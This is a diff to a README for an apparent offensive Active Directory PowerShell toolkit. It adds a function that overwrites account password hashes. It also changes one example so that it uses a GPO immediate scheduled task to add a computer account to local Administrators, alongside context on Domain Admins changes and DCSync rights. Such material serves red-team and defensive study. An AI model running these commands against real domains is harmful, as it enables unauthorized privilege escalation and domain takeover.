@@ -13,6 +13,7 @@ New-GPImmediateTask             -   creates an immediate scheduled task to push 
 Add-GPGroupMember               -   adds a domain account to a local group through a given Active Directory group policy
 Add-GPUserRightsAssignment      -   adds user rights to a domain account through a given Active Directory group policy
 Set-UserPassword                -   modifies the password of a given Active Directory account
+Set-UserNTHash                  -   modifies the password hash of a given Active Directory account
 Set-KerberosDelegation          -   adds or removes a Kerberos delegation for a given Active Directory account
 Set-LdapObject                  -   modifies properties for a given Active Directory object (e.g. members of a group)
 Set-LdapObjectOwner             -   modifies the owner for a given Active Directory object
@@ -56,7 +57,7 @@ Set-LdapObject -DistinguishedName 'CN=Domain Admins,CN=Users,DC=ADATUM,DC=CORP' 
 
 ```
 $id = (Get-LdapObject -Filter "(&(objectCategory=groupPolicyContainer)(DisplayName=Default Domain Policy))" -Properties cn).cn
-Add-GPGroupMember -PolicyId $id -BuiltinGroup Administrators -Member 'testcomputer$'
+New-GPImmediateTask -PolicyId $id -Command 'cmd.exe' -CommandArguments '/c net localgroup Administrators testcomputer$ /add' -Scope Computer
 ```
 
 * Assign 'DCSync' extended rights to a domain account:
